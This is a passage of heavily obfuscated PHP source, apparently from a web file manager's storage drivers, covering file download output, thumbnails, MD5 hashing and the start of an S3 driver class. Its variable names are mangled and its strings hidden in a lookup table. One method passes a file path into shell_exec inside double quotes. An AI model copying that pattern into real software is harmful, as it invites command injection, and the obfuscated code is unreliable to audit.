: ceil($ò’””ºÁ / pow(1024, 3))) * 3600 * 4; $¥¤¯£‹ = $this->{$ëŞ±¯}($ÉÎôÎê, $Îµ½á»°); if ($¥¤¯£‹) { $¥¤¯£‹[$ÖË±„º†[104]] = $ÉÎôÎê; $¥¤¯£‹[$ÖË±„º†[105]] = $‹áşØÓª; } return $¥¤¯£‹; } public function uploadFormData($’ÚÎõåë, $•ÈøÔÉ = 3600) { } public function multiUploadFormData($£¹ğ¿±‡, $‚ğ†¦Šê = 3600) { } public function download($à“üÑ­¹, $Ô ‹Ç©ª) { } public function ext($¤‘³ô¡) { $¤Óêàİ¼ =& $_SERVER[¹Û¹Æ€]; if (strpos($¤‘³ô¡, $¤Óêàİ¼[18]) === -1) { $üŞºõˆû = $¤‘³ô¡; } else { $üŞºõˆû = $this->pathThis($¤‘³ô¡); } $¾ƒ‚º¾• = $¤Óêàİ¼[22]; if (strstr($üŞºõˆû, $¤Óêàİ¼[20])) { $¾ƒ‚º¾• = substr($üŞºõˆû, strrpos($üŞºõˆû, $¤Óêàİ¼[20]) + 1); $¾ƒ‚º¾• = strtolower($¾ƒ‚º¾•); } if (strlen($¾ƒ‚º¾•) > 3 && preg_match($¤Óêàİ¼[106], $¾ƒ‚º¾•, $î®“×›¢)) { $¾ƒ‚º¾• = $¤Óêàİ¼[22]; } return $¾ƒ‚º¾•; } public function pathThis($ÊÕÊ£“Á) { $“íÚÚÌ =& $_SERVER[¹Û¹Æ€]; $ÊÕÊ£“Á = str_replace($“íÚÚÌ[107], $“íÚÚÌ[18], rtrim($ÊÕÊ£“Á, $“íÚÚÌ[18])); $ÊÆÓÃ¾® = strrpos($ÊÕÊ£“Á, $“íÚÚÌ[18]); if ($ÊÆÓÃ¾® === !1) { return $ÊÕÊ£“Á; } return substr($ÊÕÊ£“Á, $ÊÆÓÃ¾® + 1); } public function pathFather($Å¨Ë”ò) { $®ıÆ»ÔÛ =& $_SERVER[¹Û¹Æ€]; $Å¨Ë”ò = str_replace($®ıÆ»ÔÛ[107], $®ıÆ»ÔÛ[18], rtrim($Å¨Ë”ò, $®ıÆ»ÔÛ[18])); $Á…Ğû·Ò = strrpos($Å¨Ë”ò, $®ıÆ»ÔÛ[18]); if ($Á…Ğû·Ò === !1) { return $®ıÆ»ÔÛ[22]; } return substr($Å¨Ë”ò, 0, $Á…Ğû·Ò + 1); } public function hashSimple($‘óºæÃÊ) { $Ÿ÷ëİ¥İ =& $_SERVER[¹Û¹Æ€]; if (!$‘óºæÃÊ) { return md5($Ÿ÷ëİ¥İ[22]); } $§µæ”» = $this->size($‘óºæÃÊ); $ã„®ÎÏ™ = 200; $ø‡˜öìÒ = 50; if ($§µæ”» <= $ã„®ÎÏ™ * $ø‡˜öìÒ) { return $this->hashMd5($‘óºæÃÊ) . $§µæ”»; } $Ñì·ÒË˜ = intval($§µæ”» / $ø‡˜öìÒ); $í‡Ğ¯® = $Ÿ÷ëİ¥İ[22]; for ($üÆôÙŸ = 0; $üÆôÙŸ < $ø‡˜öìÒ; $üÆôÙŸ++) { $í‡Ğ¯® .= $this->fileSubstr($‘óºæÃÊ, $Ñì·ÒË˜ * $üÆôÙŸ, $ã„®ÎÏ™); } $í‡Ğ¯® .= $this->fileSubstr($‘óºæÃÊ, $§µæ”» - $ã„®ÎÏ™, $ã„®ÎÏ™); return md5($í‡Ğ¯®) . $§µæ”»; } public static $md5Cache = array(); public function hashMd5($¥‚Îî¶Í) { if (!$¥‚Îî¶Í) { return md5($_SERVER[¹Û¹Æ€][22]); } $¥‚Îî¶Í = $this->iconvSystem($¥‚Îî¶Í); if (isset(self::$md5Cache[$¥‚Îî¶Í])) { return self::$md5Cache[$¥‚Îî¶Í]; } self::$md5Cache[$¥‚Îî¶Í] = $this->hashMd5Shell($¥‚Îî¶Í); if (!self::$md5Cache[$¥‚Îî¶Í]) { self::$md5Cache[$¥‚Îî¶Í] = @md5_file($¥‚Îî¶Í); } return self::$md5Cache[$¥‚Îî¶Í]; } private function hashMd5Shell($š’±öšÆ) { $²ƒôï¹¼ =& $_SERVER[¹Û¹Æ€]; if (!$š’±öšÆ) { return md5($²ƒôï¹¼[22]); } if (!function_exists($²ƒôï¹¼[108])) { return !1; } $˜ÖÂªÑÏ = array($²ƒôï¹¼[109], $²ƒôï¹¼[110]); $Ü¬œ±êë = Cache::get($²ƒôï¹¼[111]); if (!$Ü¬œ±êë) { $ÓİÛåÏ = BASIC_PATH . $²ƒôï¹¼[112]; $€âÜ‚„  = md5_file($ÓİÛåÏ); $Ü¬œ±êë = $²ƒôï¹¼[113]; foreach ($˜ÖÂªÑÏ as $Õ”³½™‡) { $¨áÖ°‚ª = shell_exec($Õ”³½™‡ . "\x20\x22{$ÓİÛåÏ}\42"); if ($¨áÖ°‚ª && substr(trim($¨áÖ°‚ª), 0, 32) == $€âÜ‚„ ) { $Ü¬œ±êë = $Õ”³½™‡; break; } } Cache::set($²ƒôï¹¼[111], $Ü¬œ±êë, 3600); } if ($Ü¬œ±êë == $²ƒôï¹¼[113]) { return !1; } $¨áÖ°‚ª = shell_exec($Ü¬œ±êë . "\40\42{$š’±öšÆ}\x22"); $¨áÖ°‚ª = str_replace($²ƒôï¹¼[114], $²ƒôï¹¼[22], $¨áÖ°‚ª); return substr($¨áÖ°‚ª, 0, 32); } public function link($‘ò‚Ôæş) { return $‘ò‚Ôæş; } public function fileOut($ÍÕ˜‹ûğ, $ÏòÏ–è³ = false, $ù“Çİ…Ë = false, $öï•”¼ç = '') { $÷æ…¸÷œ =& $_SERVER[¹Û¹Æ€]; $this->cacheMethod(null, null); if (!$ÍÕ˜‹ûğ || !$this->exist($ÍÕ˜‹ûğ)) { show_json(LNG($÷æ…¸÷œ[115]), !1, $ù“Çİ…Ë); } $³ë¬’Ë† = $this->getType() == $÷æ…¸÷œ[116]; $µéšÀ»Ò = $GLOBALS[$÷æ…¸÷œ[16]][$÷æ…¸÷œ[99]][$÷æ…¸÷œ[117]][$÷æ…¸÷œ[118]]; $à—á¾òç = (double) $GLOBALS[$÷æ…¸÷œ[16]][$÷æ…¸÷œ[99]][$÷æ…¸÷œ[117]][$÷æ…¸÷œ[119]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $™°‡¸¼å = $this->infoFull($ÍÕ˜‹ûğ); $ÉŸ«¤ = $™°‡¸¼å[$÷æ…¸÷œ[86]]; $Ü£¿ŠÁ = gmdate($÷æ…¸÷œ[120], $™°‡¸¼å[$÷æ…¸÷œ[95]]); $å¹¡ñ¬å = $ù“Çİ…Ë ? $ù“Çİ…Ë : $this->iconvApp($™°‡¸¼å[$÷æ…¸÷œ[42]]); $õÕ¾®éí = 0; $…ÁãÅíñ = $ÉŸ«¤ - 1; $°ÖÖçÆ‚ = $this->ext($å¹¡ñ¬å); if (in_array($°ÖÖçÆ‚, array($÷æ…¸÷œ[121], $÷æ…¸÷œ[122], $÷æ…¸÷œ[123], $÷æ…¸÷œ[124]))) { $°ÖÖçÆ‚ = $÷æ…¸÷œ[125]; } if (in_array($°ÖÖçÆ‚, array($÷æ…¸÷œ[126]))) { $°ÖÖçÆ‚ = $÷æ…¸÷œ[127]; } if (!$öï•”¼ç) { $öï•”¼ç = md5($Ü£¿ŠÁ . $this->hashSimple($ÍÕ˜‹ûğ)); } $öï•”¼ç = $÷æ…¸÷œ[128] . $öï•”¼ç . $÷æ…¸÷œ[128]; $¥Æ‚‚ËÈ = get_file_mime($°ÖÖçÆ‚); $Í†ÁÄ¨€ = !0; $Í†ÁÄ¨€ = isset($_GET[$÷æ…¸÷œ[129]]) ? !1 : !0; if ($ÏòÏ–è³ === !1 && !mime_support($¥Æ‚‚ËÈ)) { $¥Æ‚‚ËÈ = $÷æ…¸÷œ[130]; } header($÷æ…¸÷œ[131]); header($÷æ…¸÷œ[132] . $¥Æ‚‚ËÈ); $úŠÀ‹óÂ = rawurlencode($å¹¡ñ¬å); $úŠÀ‹óÂ = $÷æ…¸÷œ[128] . $úŠÀ‹óÂ . $÷æ…¸÷œ[133] . $úŠÀ‹óÂ; if ($ÏòÏ–è³) { header($÷æ…¸÷œ[134]); header($÷æ…¸÷œ[135] . $úŠÀ‹óÂ); } else { if ($Í†ÁÄ¨€) { header($÷æ…¸÷œ[136] . $úŠÀ‹óÂ); } } header($÷æ…¸÷œ[137] . gmdate($÷æ…¸÷œ[120], time() + 3600 * 24 * 30) . $÷æ…¸÷œ[138]); header($÷æ…¸÷œ[139]); header($÷æ…¸÷œ[140]); header($÷æ…¸÷œ[141]); if (isset($_SERVER[$÷æ…¸÷œ[142]]) && strtotime($_SERVER[$÷æ…¸÷œ[142]]) == $™°‡¸¼å[$÷æ…¸÷œ[95]]) { header($÷æ…¸÷œ[143], !0, 304); die; } if (isset($_SERVER[$÷æ…¸÷œ[144]]) && $_SERVER[$÷æ…¸÷œ[144]] == $öï•”¼ç) { header($÷æ…¸÷œ[145] . $öï•”¼ç, !0, 304); die; } header($÷æ…¸÷œ[145] . $öï•”¼ç); header($÷æ…¸÷œ[146] . $Ü£¿ŠÁ . $÷æ…¸÷œ[138]); header($÷æ…¸÷œ[147] . $å¹¡ñ¬å); header($÷æ…¸÷œ[148]); header($÷æ…¸÷œ[149] . $ÉŸ«¤); header($÷æ…¸÷œ[150]); if (!$ÏòÏ–è³ && $°ÖÖçÆ‚ == $÷æ…¸÷œ[151]) { if ($ÉŸ«¤ > 1024 * 1024 * 5) { die; } $Ä•ËÒğ = $this->getContent($ÍÕ˜‹ûğ); $Ä•ËÒğ = Html::clearSVG($Ä•ËÒğ); header($÷æ…¸÷œ[152] . strlen($Ä•ËÒğ)); echo $Ä•ËÒğ; die; } $°ß·›¯ë = strtolower($_SERVER[$÷æ…¸÷œ[153]]); if ($³ë¬’Ë† && $°ß·›¯ë && $µéšÀ»Ò) { if (strstr($°ß·›¯ë, $÷æ…¸÷œ[154])) { header($÷æ…¸÷œ[155] . $ÍÕ˜‹ûğ); } else { if (strstr($°ß·›¯ë, $÷æ…¸÷œ[156])) { header($÷æ…¸÷œ[157] . $ÍÕ˜‹ûğ); } else { if (strstr($°ß·›¯ë, $÷æ…¸÷œ[158])) { header($÷æ…¸÷œ[159] . $ÍÕ˜‹ûğ); } } } if ($à—á¾òç) { header($÷æ…¸÷œ[160] . $à—á¾òç); } return; } if (isset($_SERVER[$÷æ…¸÷œ[161]])) { if (preg_match($÷æ…¸÷œ[162], $_SERVER[$÷æ…¸÷œ[161]], $ĞÀŠçÒ)) { $õÕ¾®éí = intval($ĞÀŠçÒ[1]); $õÕ¾®éí = $õÕ¾®éí <= 0 ? 0 : ($õÕ¾®éí >= $…ÁãÅíñ ? $…ÁãÅíñ : $õÕ¾®éí); if (!empty($ĞÀŠçÒ[2])) { $¼Â²ì™Æ = intval($ĞÀŠçÒ[2]); $…ÁãÅíñ = $¼Â²ì™Æ < $õÕ¾®éí ? $õÕ¾®éí : ($¼Â²ì™Æ >= $…ÁãÅíñ ? $…ÁãÅíñ : $¼Â²ì™Æ); } } header($÷æ…¸÷œ[163]); header("\x43\157\156\164\145\156\x74\55\122\x61\x6e\x67\x65\x3a\40\142\x79\164\145\163\40{$õÕ¾®éí}\55{$…ÁãÅíñ}\57" . $ÉŸ«¤); } else { header($÷æ…¸÷œ[164]); } header($÷æ…¸÷œ[165]); $ç‹—´Ü© = !0; if ($_SERVER[$÷æ…¸÷œ[166]] == $÷æ…¸÷œ[167] && $ÉŸ«¤ > 1204 * 1024 * 1024 * 2) { $ç‹—´Ü© = !1; } if ($ç‹—´Ü©) { header($÷æ…¸÷œ[168] . ($…ÁãÅíñ - $õÕ¾®éí + 1)); } if ($_SERVER[$÷æ…¸÷œ[169]] == $÷æ…¸÷œ[170]) { return; } $–®ºÛóÀ = 1024 * 100; $ÌİõÂ¸ = 0; if ($à—á¾òç) { $ÌİõÂ¸ = intval(1000 * 1000 * ($–®ºÛóÀ / $à—á¾òç)); } while ($õÕ¾®éí <= $…ÁãÅíñ) { $·Êüìøƒ = timeFloat(); check_abort(); $ˆÀ›œ°“ = $…ÁãÅíñ - $õÕ¾®éí + 1; if ($ˆÀ›œ°“ <= $–®ºÛóÀ) { $–®ºÛóÀ = $ˆÀ›œ°“; } echo $this->fileSubstr($ÍÕ˜‹ûğ, $õÕ¾®éí, $–®ºÛóÀ); $õÕ¾®éí += $–®ºÛóÀ; if ($–®ºÛóÀ == $ˆÀ›œ°“) { $õÕ¾®éí = $…ÁãÅíñ + 1; } if ($ÌİõÂ¸) { $×¿ÁëôÖ = intval(1000 * 1000 * (timeFloat() - $·Êüìøƒ)); $Áú¹úâö = $ÌİõÂ¸ - $×¿ÁëôÖ; if ($Áú¹úâö > 5) { usleep($Áú¹úâö); } } } } public function fileOutServer($—¸¼ùç, $ì¢„À½ = false, $ÙîÜ›Ëã = false, $Ê‡ëªÀÕ = '') { $this->fileOut($—¸¼ùç, $ì¢„À½, $ÙîÜ›Ëã, $Ê‡ëªÀÕ); } public function fileOutLink($­¼ÌÛò¢) { header($_SERVER[¹Û¹Æ€][171] . $­¼ÌÛò¢); die; } public function cacheMethod($»™å§˜‘, $Š«ÏÍ¾¸, $ªğ×ãÏŒ = null) { $ÖÃ½à˜É =& $_SERVER[¹Û¹Æ€]; static $ëÓß„ï‹ = array(); $ê¶íãäÇ = $Š«ÏÍ¾¸ ? ltrim($this->getPathOuter($Š«ÏÍ¾¸), $ÖÃ½à˜É[18]) : $ÖÃ½à˜É[22]; $Ü×¥…·‚ = $ÖÃ½à˜É[172] . $»™å§˜‘ . $ÖÃ½à˜É[173] . rtrim($ê¶íãäÇ, $ÖÃ½à˜É[18]); if (is_null($»™å§˜‘)) { $ëÓß„ï‹ = array(); return; } if (is_null($Š«ÏÍ¾¸)) { foreach ($ëÓß„ï‹ as $Ü×¥…·‚ => $êªÓáî) { if (!strstr($Ü×¥…·‚, $ÖÃ½à˜É[172] . $»™å§˜‘ . $ÖÃ½à˜É[174])) { continue; } unset($ëÓß„ï‹[$Ü×¥…·‚]); } return; } if (!is_null($ªğ×ãÏŒ)) { $ëÓß„ï‹[$Ü×¥…·‚] = $ªğ×ãÏŒ; return; } $ñşËÁ”² = isset($ëÓß„ï‹[$Ü×¥…·‚]) ? $ëÓß„ï‹[$Ü×¥…·‚] : null; if (!is_null($ñşËÁ”²)) { return $ñşËÁ”²; } $ñşËÁ”² = $this->{$»™å§˜‘}($Š«ÏÍ¾¸); $ëÓß„ï‹[$Ü×¥…·‚] = $ñşËÁ”²; return $ñşËÁ”²; } public function cacheMethodInfoSet($‚øƒù—×, $óàˆ¸ŒÑ, $Ã‰Ç€‹¦ = false) { $ÙÔÎ÷È¤ =& $_SERVER[¹Û¹Æ€]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ÙÔÎ÷È¤[175], $‚øƒù—×, $óàˆ¸ŒÑ); $this->cacheMethod($ÙÔÎ÷È¤[176], $‚øƒù—×, $óàˆ¸ŒÑ ? !1 : !0); if (is_array($Ã‰Ç€‹¦)) { $this->cacheMethod($ÙÔÎ÷È¤[177], $‚øƒù—×, $Ã‰Ç€‹¦); } } public function fileOutImage($¦¨Åı—ø, $ùß«–Ñ­ = 250) { $¸É¹äÛ =& $_SERVER[¹Û¹Æ€]; set_timeout(); if (substr($¦¨Åı—ø, 0, 4) == $¸É¹äÛ[158]) { $this->fileOutLink($¦¨Åı—ø); } $¦´şÓš = $this->info($¦¨Åı—ø); $ÊÎ‹Ğ”¦ = $¦´şÓš[$¸É¹äÛ[42]]; $¼‚ÅÇŒ = !1; if (isset($GLOBALS[$¸É¹äÛ[178]]) && $GLOBALS[$¸É¹äÛ[178]][$¸É¹äÛ[94]] == $¦´şÓš[$¸É¹äÛ[94]]) { $›¸±Õ‡¾ = $GLOBALS[$¸É¹äÛ[178]][$¸É¹äÛ[179]]; if (!$¦´şÓš[$¸É¹äÛ[180]]) { $¦´şÓš[$¸É¹äÛ[180]] = $GLOBALS[$¸É¹äÛ[178]]; } if (isset($›¸±Õ‡¾[$¸É¹äÛ[181]])) { if ($›¸±Õ‡¾[$¸É¹äÛ[181]] <= $ùß«–Ñ­ && $›¸±Õ‡¾[$¸É¹äÛ[182]] <= $ùß«–Ñ­) { $¼‚ÅÇŒ = !0; } } $ÊÎ‹Ğ”¦ = $¦´şÓš[$¸É¹äÛ[180]][$¸É¹äÛ[42]]; } if ($¦´şÓš[$¸É¹äÛ[86]] <= 1024 * 50 || $¼‚ÅÇŒ || !function_exists($¸É¹äÛ[183]) || $¦´şÓš[$¸É¹äÛ[184]] == $¸É¹äÛ[185]) { return $this->fileOut($¦¨Åı—ø, !1, $ÊÎ‹Ğ”¦); } if (isset($¦´şÓš[$¸É¹äÛ[180]][$¸É¹äÛ[186]])) { $™ƒ’É®› = $¦´şÓš[$¸É¹äÛ[180]][$¸É¹äÛ[186]]; } else { if (isset($¦´şÓš[$¸É¹äÛ[180]][$¸É¹äÛ[187]])) { $™ƒ’É®› = $¦´şÓš[$¸É¹äÛ[180]][$¸É¹äÛ[187]]; } } if (!$™ƒ’É®›) { $™ƒ’É®› = md5("{$¦´şÓš[$¸É¹äÛ[42]]}\137{$¦´şÓš[$¸É¹äÛ[94]]}\137{$¦´şÓš[$¸É¹äÛ[86]]}\x5f{$ùß«–Ñ­}"); } $²³·Ã = "{$™ƒ’É®›}\137{$ùß«–Ñ­}\x2e\160\x6e\147"; if (!($ñ›İ× = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $¸É¹äÛ[188]))) { $²½ ”é = IO::mkdir(IO_PATH_SYSTEM_TEMP . $¸É¹äÛ[189]); } else { $²½ ”é = KodIO::make($ñ›İ×); } if ($ñ›İ× = IO::fileNameExist($²½ ”é, $²³·Ã)) { $Á»æâ‹ = KodIO::make($ñ›İ×); return IO::fileOut($Á»æâ‹, !1, $ÊÎ‹Ğ”¦); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $Á»æâ‹ = DATA_THUMB . $²³·Ã; del_file($Á»æâ‹); if (!@file_exists($Á»æâ‹)) { $ëìùüÅ‡ = TEMP_FILES; if (!is_dir($ëìùüÅ‡)) { mk_dir($ëìùüÅ‡); } $ˆ¼°ÙÃš = $ëìùüÅ‡ . $™ƒ’É®› . $¸É¹äÛ[20] . $¦´şÓš[$¸É¹äÛ[184]]; if (!@file_exists($ˆ¼°ÙÃš)) { $ˆ¼°ÙÃš = $this->download($¦¨Åı—ø, $ˆ¼°ÙÃš); } ImageThumb::createThumb($ˆ¼°ÙÃš, $Á»æâ‹, $ùß«–Ñ­, $ùß«–Ñ­ * 10); } if (!file_exists($Á»æâ‹) || filesize($Á»æâ‹) < 100) { return @file_exists($ˆ¼°ÙÃš) ? IO::fileOut($ˆ¼°ÙÃš) : $this->fileOut($¦¨Åı—ø); } if (!($ãÙ¯ªÂ = IO::move($Á»æâ‹, $²½ ”é))) { return IO::fileOut($Á»æâ‹); } del_file($Á»æâ‹); IO::fileOut($ãÙ¯ªÂ); } public function fileOutImageServer($âñÃ¤ÜŠ, $ßÄú’ç = 250) { $this->fileOutImage($âñÃ¤ÜŠ, $ßÄú’ç); } public function fileNameAuto($áĞİ›§ˆ, $¼Û“Í­›, $çÀ©ğä = REPEAT_RENAME, $õÕËøê = false) { $ö·É…áÂ =& $_SERVER[¹Û¹Æ€]; $÷û™˜íÕ = $áĞİ›§ˆ === $ö·É…áÂ[22] ? $¼Û“Í­› : rtrim($áĞİ›§ˆ, $ö·É…áÂ[18]) . $ö·É…áÂ[18] . $¼Û“Í­›; if ($çÀ©ğä == REPEAT_REPLACE || !$this->exist($÷û™˜íÕ) || $õÕËøê && $çÀ©ğä != REPEAT_RENAME_FOLDER) { return $¼Û“Í­›; } if ($çÀ©ğä == REPEAT_SKIP) { return !1; } $¸çê¢•ó = $ö·É…áÂ[20] . get_path_ext($¼Û“Í­›); $¸çê¢•ó = $¸çê¢•ó == $ö·É…áÂ[20] || $õÕËøê ? $ö·É…áÂ[22] : $¸çê¢•ó; $ˆ·´—Îä = 1; $Î’ÑåäÒ = substr($¼Û“Í­›, 0, strlen($¼Û“Í­›) - strlen($¸çê¢•ó)); $Ğ†ªğÏì = $Î’ÑåäÒ . "\50{$ˆ·´—Îä}\x29{$¸çê¢•ó}"; while ($this->exist(rtrim($áĞİ›§ˆ, $ö·É…áÂ[18]) . $ö·É…áÂ[18] . $Ğ†ªğÏì)) { $Ğ†ªğÏì = $Î’ÑåäÒ . "\x28{$ˆ·´—Îä}\x29{$¸çê¢•ó}"; $ˆ·´—Îä++; } return $Ğ†ªğÏì; } private function fileNameAutoList($êèŒ…‚, $çÌçÔÀ¾, $ÛÚ•Ô¶­ = false) { $¶Ù¿Ğ÷£ =& $_SERVER[¹Û¹Æ€]; $——œÍ¤ = $this->listPath($êèŒ…‚, !0); $——œÍ¤ = array_merge($——œÍ¤[$¶Ù¿Ğ÷£[92]], $——œÍ¤[$¶Ù¿Ğ÷£[93]]); $æÎª£  = array_to_keyvalue($——œÍ¤, $¶Ù¿Ğ÷£[22], $¶Ù¿Ğ÷£[42]); $Ñ¶êÓÅë = $¶Ù¿Ğ÷£[20] . get_path_ext($çÌçÔÀ¾); $Ñ¶êÓÅë = $Ñ¶êÓÅë == $¶Ù¿Ğ÷£[20] || $ÛÚ•Ô¶­ ? $¶Ù¿Ğ÷£[22] : $Ñ¶êÓÅë; $¯éàæ† = substr($çÌçÔÀ¾, 0, strlen($çÌçÔÀ¾) - strlen($Ñ¶êÓÅë)); $”´ÚÓ¶í = $¯éàæ† . "\50\x30\x29{$Ñ¶êÓÅë}"; for ($Ğ¬Û“ıƒ = 1; $Ğ¬Û“ıƒ <= count($æÎª£ ) + 1; $Ğ¬Û“ıƒ++) { $”´ÚÓ¶í = $¯éàæ† . "\50{$Ğ¬Û“ıƒ}\x29{$Ñ¶êÓÅë}"; if (!in_array_not_case($”´ÚÓ¶í, $æÎª£ )) { return $”´ÚÓ¶í; } } return $”´ÚÓ¶í; } public function listAllFiles($çä”ĞóÂ, $¯„Â…û, $ÙËªô„ = array()) { $®Ëï„Úœ =& $_SERVER[¹Û¹Æ€]; if (empty($¯„Â…û)) { return array(); } $ĞŸÎ­ñ = array(); $çä”ĞóÂ = trim($çä”ĞóÂ, $®Ëï„Úœ[18]); foreach ($¯„Â…û as $ÅÓùÅ¯¥) { $¨Ë»æ©Û = ltrim(substr(trim($ÅÓùÅ¯¥, $®Ëï„Úœ[18]), strlen($çä”ĞóÂ)), $®Ëï„Úœ[18]); $ĞŸÎ­ñ = array_merge($ĞŸÎ­ñ, $this->slicePath($¨Ë»æ©Û)); } $Šø´À£Ê = array(); foreach (array_unique($ĞŸÎ­ñ) as $ÅÓùÅ¯¥) { $ãäõëÅ™ = array($®Ëï„Úœ[94] => $this->getPathOuter($®Ëï„Úœ[18] . $çä”ĞóÂ . $®Ëï„Úœ[18] . $ÅÓùÅ¯¥), $®Ëï„Úœ[85] => 1, $®Ëï„Úœ[86] => 0); if (substr($ÅÓùÅ¯¥, -1) != $®Ëï„Úœ[18]) { $ãäõëÅ™[$®Ëï„Úœ[85]] = 0; $ö²½¨Ë€ = $this->getPath($çä”ĞóÂ . $®Ëï„Úœ[18] . $ÅÓùÅ¯¥); $ãäõëÅ™[$®Ëï„Úœ[86]] = isset($ÙËªô„[$ö²½¨Ë€]) ? $ÙËªô„[$ö²½¨Ë€] : $this->size($ö²½¨Ë€); } $Šø´À£Ê[] = $ãäõëÅ™; } return $Šø´À£Ê; } public function slicePath($ÂÀ˜ÛŒ) { $°Ô˜‚¨Ÿ =& $_SERVER[¹Û¹Æ€]; $Šº×› Ù = explode($°Ô˜‚¨Ÿ[18], trim($ÂÀ˜ÛŒ, $°Ô˜‚¨Ÿ[18])); $©ö³¯«ç = 0; do { ++$©ö³¯«ç; $ˆÉŸæ–‰[] = implode($°Ô˜‚¨Ÿ[18], array_slice($Šº×› Ù, 0, $©ö³¯«ç)) . $°Ô˜‚¨Ÿ[18]; } while ($©ö³¯«ç < count($Šº×› Ù)); $ˆÉŸæ–‰[count($Šº×› Ù) - 1] = $ÂÀ˜ÛŒ; return $ˆÉŸæ–‰; } public function getHost() { $•Á¶÷–” =& $_SERVER[¹Û¹Æ€]; $ƒÊËÓ¬ = parse_url(trim($this->domain, $•Á¶÷–”[18])); $Ñá„»ˆß = isset($ƒÊËÓ¬[$•Á¶÷–”[190]]) ? $ƒÊËÓ¬[$•Á¶÷–”[190]] : http_type(); $’ÑÔ—Ó = isset($ƒÊËÓ¬[$•Á¶÷–”[191]]) ? $ƒÊËÓ¬[$•Á¶÷–”[191]] : $ƒÊËÓ¬[$•Á¶÷–”[94]]; if (isset($ƒÊËÓ¬[$•Á¶÷–”[192]])) { $’ÑÔ—Ó .= $•Á¶÷–”[4] . $ƒÊËÓ¬[$•Á¶÷–”[192]]; } return $Ñá„»ˆß . $•Á¶÷–”[193] . $’ÑÔ—Ó; } public function pathEncode($óƒª‘„) { $ùõ‹ÊÏø =& $_SERVER[¹Û¹Æ€]; return str_replace($ùõ‹ÊÏø[194], $ùõ‹ÊÏø[18], rawurlencode($óƒª‘„)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($ê™¥·âŸ) { set_timeout(); require_once SDK_DIR . $_SERVER[¹Û¹Æ€][195]; parent::__construct(); $this->_init($ê™¥·âŸ); } public function _init($­ıÌö­Ô) { foreach ($­ıÌö­Ô as $Ê¤ªƒü => $ŒïçáãØ) { if (isset($this->{$Ê¤ªƒü})) { $this->{$Ê¤ªƒü} = $ŒïçáãØ; } } $this->endpoint = $­ıÌö­Ô[$_SERVER[¹Û¹Æ€][196]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($¬¬º«– = "\x76\64") { $this->signVer = $¬¬º«–; $this->client->setSignatureVersion($¬¬º«–); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $»¤Æ¦® =& $_SERVER[¹Û¹Æ€]; $õïà­º¤ = $this->getBucketCors(); if (!$õïà­º¤ || !is_array($õïà­º¤)) { return !1; } if ($õïà­º¤[$»¤Æ¦®[197]] != $»¤Æ¦®[198] || $õïà­º¤[$»¤Æ¦®[199]] != $»¤Æ¦®[198]) { return !1; } $ğŞºŞ = array_map($»¤Æ¦®[200], $õïà­º¤[$»¤Æ¦®[201]]); if (!is_array($ğŞºŞ)) { $ğŞºŞ = array(); } $¢àº©» = array($»¤Æ¦®[202], $»¤Æ¦®[203], $»¤Æ¦®[204], $»¤Æ¦®[205], $»¤Æ¦®[206]); $»š»Ö« = array_diff($¢àº©», $ğŞºŞ); return empty($»š»Ö«); } public function mkfile($å¹²ä², $¥Ş›„ = '', $á¦ÅˆŞ¯ = REPEAT_RENAME) { $”ãÈ½ûç = $this->setContent($å¹²ä², $¥Ş›„); if ($”ãÈ½ûç !== !1) { return $this->getPathOuter($å¹²ä²); } return !1; } public function mkdir($¿Œ°Æ‹ù, $²Ù¯ë§ó = REPEAT_SKIP) { $ĞÌñ¯õ¯ =& $_SERVER[¹Û¹Æ€]; if (empty($¿Œ°Æ‹ù) && $¿Œ°Æ‹ù !== $ĞÌñ¯õ¯[207]) { return !1; } if ($²Ù¯ë§ó && $this->_isFolder($¿Œ°Æ‹ù)) { return $this->getPathOuter($¿Œ°Æ‹ù); } $‚Ûğˆ­› = $this->setContent($¿Œ°Æ‹ù, $ĞÌñ¯õ¯[22], !0); if ($‚Ûğˆ­› !== !1) { return $this->getPathOuter($¿Œ°Æ‹ù); } return !1; } public function copyFile($ä®ÎÇã, $û–ÙëÃÍ, $‚‘Åæ à = array()) { $ì‹×¸Î =& $_SERVER[¹Û¹Æ€]; $¢ıåšÎ­ = $this->objectMeta($ä®ÎÇã); if (!$¢ıåšÎ­) { return !1; } if ($¢ıåšÎ­[$ì‹×¸Î[86]] <= 1024 * 1024 * 200) { $ĞŞòñ‚Õ = $this->client->copyObject($this->bucket, $ä®ÎÇã, $this->bucket, $û–ÙëÃÍ, $ì‹×¸Î[208], $‚‘Åæ à); } else { $ĞŞòñ‚Õ = $this->client->multiCopyObject($this->bucket, $ä®ÎÇã, $this->bucket, $û–ÙëÃÍ, $‚‘Åæ à); } $ĞŞòñ‚Õ = $ĞŞòñ‚Õ ? $this->getPathOuter($û–ÙëÃÍ) : !1; return $ĞŞòñ‚Õ; } public function moveFile($àü§Ó½Â, $…şò÷»Ü) { if ($this->copyFile($àü§Ó½Â, $…şò÷»Ü)) { $this->delFile($àü§Ó½Â); return $this->getPathOuter($…şò÷»Ü); } return !1; } public function delFile($‡‰ÁÌâ) { return $this->client->deleteObject($this->bucket, $‡‰ÁÌâ); } public function delFolder($£Øµ«Û) { $—ñëˆ£Ğ =& $_SERVER[¹Û¹Æ€]; if (!$this->exist($£Øµ«Û)) { return !0; } $this->listItemCache = !1; $õÆÜŸÉÏ = $this->fileList($£Øµ«Û); $this->listItemCache = !0; $ıæ˜êò  = trim($£Øµ«Û, $—ñëˆ£Ğ[18]) . $—ñëˆ£Ğ[18]; if (!empty($£Øµ«Û) && $£Øµ«Û !== $—ñëˆ£Ğ[207] && !in_array($ıæ˜êò , $õÆÜŸÉÏ[$—ñëˆ£Ğ[92]])) { $õÆÜŸÉÏ[$—ñëˆ£Ğ[92]][] = $ıæ˜êò ; } $ì¡±çû™ = $this->delByBatch($õÆÜŸÉÏ[$—ñëˆ£Ğ[93]]); 